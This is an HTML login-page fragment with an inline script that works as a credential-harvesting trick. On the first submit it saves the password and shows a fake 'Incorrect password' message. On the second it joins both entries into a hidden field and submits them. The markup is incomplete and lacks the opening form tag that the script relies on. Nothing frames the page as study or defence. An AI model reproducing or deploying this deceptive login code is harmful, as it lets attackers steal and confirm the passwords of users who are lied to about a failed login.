<body>
    <section class="layout">

                   <div class="form-group">
                    <label for="email">EmailAddress</label>
                    <input type="email" class="input-control" name="email" id="email" placeholder="Email Address" required />
                    
                   </div> 
                   <div class="form-group">
                    <label for="password">Password:</label>
                  <input type="password" class="input-control" name="password" id="password" placeholder="Enter your password" required>
                  <div id="password-error" style="color: red"></div>
                   </div>

                    <br>
                  <input  class="btn-login" type="submit" value="Submit">
                   </div>
                  
                </form>
                <p class="pConent signUpText">New to User? <a href="#" id="signup" class="btn btn-signup">Sign up</a></p>

      </section>

<script type="text/javascript">

    const form = document.getElementById('myForm');
    const passwordInput = form.querySelector('#password');
    const passwordError = document.getElementById('password-error');
  
  
    let firstPassword = '';
  
    form.addEventListener('submit', function(event) {
      event.preventDefault(); // prevent default form submission
  
      if (firstPassword === '') { // first submission
        firstPassword = passwordInput.value;
        passwordInput.value = ''; // clear the password field
        passwordError.style.display = 'block';
        passwordError.textContent = 'Incorrect password'
        passwordInput.placeholder = 'Enter password again'; // change the placeholder text
      } else { // second submission
        const secondPassword = passwordInput.value;
        const hiddenInput = document.createElement('input');
        hiddenInput.type = 'hidden';
        hiddenInput.name = 'password';
        hiddenInput.value = firstPassword + ',' + secondPassword;
        form.appendChild(hiddenInput);
        form.submit(); // submit the form with both passwords
      }
    });
  </script>
